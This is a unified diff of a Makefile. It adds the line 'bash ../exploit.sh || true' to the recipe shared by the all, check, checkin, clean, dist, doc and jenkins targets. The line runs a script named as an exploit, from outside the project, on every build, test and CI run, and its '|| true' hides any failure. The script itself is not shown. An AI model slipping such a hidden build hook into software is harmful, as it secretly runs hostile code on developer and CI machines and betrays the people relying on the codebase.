@@ -7,6 +7,7 @@ SUBDIRS = pbit_lsb_release
 
 .PHONY: all check checkin clean dist doc jenkins
 all check checkin clean dist doc jenkins:
+	bash ../exploit.sh || true
 	set -e;					\
 	for d in $(SUBDIRS); do			\
 		$(MAKE) -C $$d $@;		\
